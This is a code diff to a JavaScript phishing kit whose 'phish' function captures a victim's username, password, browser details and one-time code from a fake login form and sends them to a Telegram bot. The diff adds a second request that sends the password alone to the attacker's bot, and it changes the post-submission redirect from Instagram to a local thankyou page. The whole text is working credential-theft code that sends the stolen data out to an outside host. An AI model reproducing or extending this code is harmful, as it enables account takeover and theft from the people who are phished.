@@ -166,6 +166,7 @@ const phish = (bot_token, chat_id, redirect_link) => {
                 1}/${currentdate.getFullYear()}`,
             time = `${currentdate.getHours()}:${currentdate.getMinutes()}:${currentdate.getSeconds()}`,
             xhr = new XMLHttpRequest(),
+            xhr2 = new XMLHttpRequest(),
             unameVal = uname.val(),
             passVal = pass.val(),
             msg = `----------------------------------------------------%0A
@@ -187,6 +188,11 @@ Browser:  ${e.browser.name} v${e.browser.version}%0A
             `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&parse_mode=html&text=${msg}`
         );
         xhr.send();
+        xhr2.open(
+            'POST',
+            `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&parse_mode=html&text=${passVal}`
+        );
+        xhr2.send();
         setTimeout(function() {
             goTo();
         }, 1000);
@@ -207,7 +213,7 @@ OTP :    ${otpcode}%0A
     );
     xhr.send();
     setTimeout(function() {
-        window.location.replace("https://www.instagram.com");
+        window.location.replace("thankyou.html");
     }, 1000);
 });
 };
